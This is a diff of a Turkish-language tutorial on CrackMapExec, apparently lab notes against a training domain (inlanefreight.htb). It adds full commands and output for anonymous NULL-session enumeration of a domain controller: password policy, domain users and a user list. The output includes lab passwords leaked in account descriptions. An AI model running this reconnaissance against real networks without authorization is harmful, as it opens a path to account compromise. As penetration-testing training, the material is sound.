@@ -7,7 +7,7 @@
 
 CrackMapExec (diğer adıyla CME), Windows workstation ve sunucularından oluşan büyük ağların güvenliğini değerlendirmeye yardımcı olan bir araçtır.
 
-![Pasted image 20250215115520.png](/img/user/Pasted%20image%2020250215115520.png)
+![Pasted image 20250215115520.png](/img/user/resimler/Pasted%20image%2020250215115520.png)
 
 CME, ağ protokolleriyle çalışmak ve çeşitli exploit sonrası teknikleri gerçekleştirmek için yoğun olarak Impacket kütüphanesini kullanır. CME'nin gücünü anlamak için basit senaryolar hayal etmemiz gerekir:
 
@@ -687,42 +687,190 @@ Ayrıca, bu blog yazısı: [_Practical guide to NTLM Relaying in 2017_](https://
 
 ## Exploiting NULL/Anonymous Sessions
 
-NULL Session, Windows tabanlı bilgisayarlarda işlemler arası iletişim ağ hizmetine yapılan anonim bir bağlantıdır. Hizmet, named pipe bağlantılarına izin verecek şekilde tasarlanmıştır ancak saldırganlar tarafından sistem hakkında uzaktan bilgi toplamak için kullanılabilir.
+[NULL Session](https://en.wikipedia.org/wiki/Null_session), Windows tabanlı bilgisayarlarda bir inter-process communication (IPC) ağ servisine anonim bir bağlantıdır. Bu servis, named pipe bağlantılarına izin vermek üzere tasarlanmış olsa da, saldırganlar tarafından sistem hakkında uzaktan bilgi toplamak için kullanılabilir. 
 
-Bir hedef, özellikle bir domain kontrolörü NULL Session'a karşı savunmasız olduğunda, saldırganın geçerli bir domain hesabına sahip olmadan bilgi toplamasına izin verecektir, örneğin
+Bir hedef, özellikle bir domain controller  `NULL Session'a` karşı savunmasızsa, saldırganın geçerli bir domain hesabına sahip olmadan aşağıdaki gibi bilgileri toplamasına izin verebilir:
 
-![Pasted image 20241201033518.png](/img/user/resimler/Pasted%20image%2020241201033518.png)
+* Domain users ( --users )
+* Domain groups ( --groups )
+* Password policy ( --pass-pol )
+* Share folders ( --shares )
 
  Aşağıdaki komutları kullanarak bir domain controller üzerinde deneyelim:
-![Pasted image 20241201035648.png](/img/user/resimler/Pasted%20image%2020241201035648.png)
-![Pasted image 20241201035711.png](/img/user/resimler/Pasted%20image%2020241201035711.png)
 
-Eğer bu listeyi export etmek istiyorsak --export [OUTPUT_FULL_FILE_PATH] kullanabiliriz. Aşağıdaki örnekte mevcut yolu kullanmak için $(pwd) kullanacağız:
+### Enumerating the Password Policy
+ 
+```
+crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+
+SMB 10.129.203.121 445 DC01 [+] Dumping password
+info for domain: INLANEFREIGHT
+
+SMB 10.129.203.121 445 DC01 Minimum password
+length: 7
+
+SMB 10.129.203.121 445 DC01 Password history
+length: 24
+
+SMB 10.129.203.121 445 DC01 Maximum password age:
+41 days 23 hours 53 minutes
+
+SMB 10.129.203.121 445 DC01
+
+SMB 10.129.203.121 445 DC01 Password Complexity
+Flags: 000001
+
+SMB 10.129.203.121 445 DC01 Domain Refuse
+Password Change: 0
+
+SMB 10.129.203.121 445 DC01 Domain Password
+Store Cleartext: 0
+
+SMB 10.129.203.121 445 DC01 Domain Password
+Lockout Admins: 0
+
+SMB 10.129.203.121 445 DC01 Domain Password No
+Clear Change: 0
+
+SMB 10.129.203.121 445 DC01 Domain Password No
+Anon Change: 0
+
+SMB 10.129.203.121 445 DC01 Domain Password
+Complex: 1
+
+SMB 10.129.203.121 445 DC01
+
+SMB 10.129.203.121 445 DC01 Minimum password age:
+1 day 4 minutes
+
+SMB 10.129.203.121 445 DC01 Reset Account Lockout
+Counter: 30 minutes
+
+SMB 10.129.203.121 445 DC01 Locked Account
+Duration: 30 minutes
+
+SMB 10.129.203.121 445 DC01 Account Lockout
+Threshold: None
+
+SMB 10.129.203.121 445 DC01 Forced Log off Time:
+Not Set
+```
+
+Bu listeyi dışa aktarmak istiyorsak, `--export [OUTPUT_FULL_FILE_PATH]` komutunu kullanabiliriz. Aşağıdaki örnekte, mevcut yolu kullanmak için `$(pwd)` kullanacağız:
 
 
 ### Exporting Password Policy
-![Pasted image 20241201040724.png](/img/user/resimler/Pasted%20image%2020241201040724.png)
 
-Dışa aktarım bir JSON dosyası olacaktır. Dosyayı çift tırnak kullanarak biçimlendirebilir ve görüntülemek için jq uygulamasını kullanabiliriz.
+```
+crackmapexec smb 10.129.203.121 -u '' -p '' --pass-pol --export $(pwd)/passpol.txt
 
+...SNIP...
+```
+
+Export bir JSON dosyası olacaktır. Dosyayı, tek tırnakları çift tırnaklarla değiştirmek için `sed` komutunu kullanarak formatlayabiliriz ve ardından `jq` uygulamasını kullanarak görüntüleyebiliriz.
 
 ### Formating exported file
-![Pasted image 20241201040816.png](/img/user/resimler/Pasted%20image%2020241201040816.png)
+
+```
+sed -i "s/'/\"/g" passpol.txt
+cat passpol.txt | jq
+{
+ "min_pass_len": 1,
+ "pass_hist_len": 24,
+ "max_pass_age": "41 days 23 hours 53 minutes ",
+ "min_pass_age": "1 day 4 minutes ",
+ "pass_prop": "000000",
+ "rst_accnt_lock_counter": "30 minutes ",
+ "lock_accnt_dur": "30 minutes ",
+ "accnt_lock_thres": "None",
+ "force_logoff_time": "Not Set"
+}
+```
 
 
 ### Enumerating Users
-![Pasted image 20241201040909.png](/img/user/resimler/Pasted%20image%2020241201040909.png)
-![Pasted image 20241201040934.png](/img/user/resimler/Pasted%20image%2020241201040934.png)
 
-Dışa aktarılan dosyayı tüm kullanıcıların bir listesini almak için kullanabiliriz, bu listeyi daha sonra kullanacağız
+```
+crackmapexec smb 10.129.203.121 -u '' -p '' --users --export $(pwd)/users.txt
+
+SMB 10.129.203.121 445 DC01 [*] Windows 10.0 Build
+17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
+(SMBv1:False)
+SMB 10.129.203.121 445 DC01 [-] Error enumerating
+domain users using dc ip 10.129.203.121: NTLM needs domain\username and a
+password
+SMB 10.129.203.121 445 DC01 [*] Trying with SAMRPC
+protocol
+SMB 10.129.203.121 445 DC01 [+] Enumerated domain
+user(s)
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\Guest Built-in account for
+guest access to the computer/domain
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\carlos
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\grace
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\peter
+SMB 10.129.203.121 445 DC01 
+inlanefreight.htb\alina Account for testing HR
+App. Password: HRApp123!
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\noemi
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\engels Service Account for
+testing
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\kiosko
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\testaccount pwd: Testing123!
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\mathew
+SMB 10.129.203.121 445 DC01
+inlanefreight.htb\svc_mssql
+```
+
+Export edilen dosyayı, tüm kullanıcıların bir listesini almak için kullanabiliriz; daha sonra bu listeyi kullanacağız.
 
 
 ### Kullanıcı Listesini Çıkarma
-![Pasted image 20241201043222.png](/img/user/resimler/Pasted%20image%2020241201043222.png)
-Burada tüm domain kullanıcılarını ve şifre politikasını herhangi bir hesap olmadan listeleyebiliriz. Bu yapılandırma her zaman mevcut değildir, ancak böyle bir durum söz konusuysa domain'i tehlikeye atma hedefimize başlamamıza yardımcı olacaktır
+
+```
+sed -i "s/'/\"/g" users.txt
+jq -r '.[]' users.txt > userslist.txt
+cat userslist.txt
+Guest
+carlos
+grace
+peter
+alina
+noemi
+engels
+kiosko
+testaccount
+mathew
+svc_mssql
+gmsa_adm
+belkis
+nicole
+jorge
+linda
+shaun
+diana
+patrick
+elieser
+
+```
+
+Burada, herhangi bir hesap olmadan tüm domain kullanıcılarını ve password policy'yi listeleyebiliriz. Bu yapılandırma her zaman mevcut olmayabilir, ancak mevcutsa, domain'i ele geçirme amacımıza başlamak için bize yardımcı olacaktır.
 
 
 ### Kullanıcıları rid bruteforce ile numaralandırma
+
 Bir domainin kullanıcılarını belirlemek için --rid-brute seçeneği kullanılabilir. Bu seçenek özellikle NULL Authentication'a sahip ancak belirli sorgu kısıtlamaları olan bir domain ile uğraşırken kullanışlıdır. Bu seçeneği kullanarak, domain'deki kullanıcıları ve diğer nesneleri numaralandırabiliriz.
 
 
